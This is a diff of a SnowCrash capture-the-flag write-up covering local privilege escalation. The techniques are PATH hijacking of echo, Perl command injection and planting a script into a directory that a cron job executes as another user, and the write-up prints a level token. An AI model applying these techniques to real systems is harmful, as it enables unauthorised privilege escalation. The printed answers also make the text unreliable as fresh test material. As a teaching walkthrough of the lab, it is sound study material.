@@ -340,6 +340,8 @@ system("/usr/bin/env echo Exploit me"Exploit me
 
 As we can see, the program is actually making a call to ``echo``. This is our door. Since the program is using the ``PATH`` to ``echo``, we can modify the ``PATH`` to run our own ``echo`` command.
 
+### Retrieving the token
+
 To do so, we need to create our fake echo and making it executable:
 ```bash
 level03@SnowCrash:~$ echo '/bin/getflag' > /tmp/echo
@@ -419,6 +421,8 @@ test
 
 This time it worked! And this is where we are going to attack.
 
+### Retrieving the token
+
 In Perl, we need to becareful when letting the possibility to put people's own params (https://perldoc.perl.org/perlsec)
 
 In our case, we can manipulate what we send to run our own command. How? By closing earlier ``echo``'s quotes!
@@ -441,5 +445,77 @@ level05@SnowCrash:~$
 ```
 
 The token is indeed valid!
+
+</details>
+
+## level05
+
+<details>
+
+<summary>Explanations</summary>
+
+### Finding hints
+
+We are back on a level without any file in first place. However, when logging on the level 05 user, we received this:
+```bash
+level05@127.0.0.1's password: 
+You have new mail.
+level05@SnowCrash:~$
+```
+
+We apparently received a mail, so let's check it out:
+```bash
+level05@SnowCrash:~$ ls /var/mail
+level05
+level05@SnowCrash:~$ cat /var/mail/level05 
+*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
+```
+
+With this mail named ``level05``, we learn that the mail was sent by flag05, the user we are trying to get the flag from.
+
+The content of the mail looks familiar tho. It is actually a cron script. This is our big hint. We learn from that that every 2 minutes, flag05 is running this command: ``su -c "sh /usr/sbin/openarenaserver"``
+
+Let's check what is the script ``/usr/sbin/openarenaserver`` then:
+```bash
+level05@SnowCrash:~$ cat /usr/sbin/openarenaserver 
+#!/bin/sh
+
+for i in /opt/openarenaserver/* ; do
+	(ulimit -t 5; bash -x "$i")
+	rm -f "$i"
+done
+```
+
+What this script does is looping on every file of the directory ``/opt/openarenaserver/``, executing each one by one with ``bash -x "$i"``, and then deleting each one by one after executing each with ``rm -f "$i"``.
+
+This is from there that we need to get our flag. Since the cron is made by flag05, it is possible to make the user flag05 execute whatever we want. And so that's what we are going to do. We want to gather the flag with the command ``getflag``, so let's make the cron do it for us:
+
+### Retrieving the token
+
+- First, we need to create script that runs ``getflag`` and saves the output:
+```bash
+level05@SnowCrash:~$ echo "/bin/getflag > /tmp/flag" > /tmp/getflag.sh
+```
+
+- Then, we need to make this script executable and moving it into ``/opt/openarenaserver/``:
+```bash
+level05@SnowCrash:~$ chmod +x /tmp/getflag.sh
+level05@SnowCrash:~$ cp /tmp/getflag.sh /opt/openarenaserver/getflag.sh
+```
+
+And now we have to wait for the cron to execute ``usr/sbin/openarenaserver`` on its own. When it's done, a new file ``/tmp/flag`` will be created:
+```bash
+level05@SnowCrash:~$ cat /tmp/flag
+Check flag.Here is your token : viuaaale9huek52boumoomioc
+```
+
+It contains a token, let's check if this is the right one:
+```bash
+level05@SnowCrash:~$ su level06
+Password: 
+level06@SnowCrash:~$ 
+```
+
+It worked!
 
 </details>
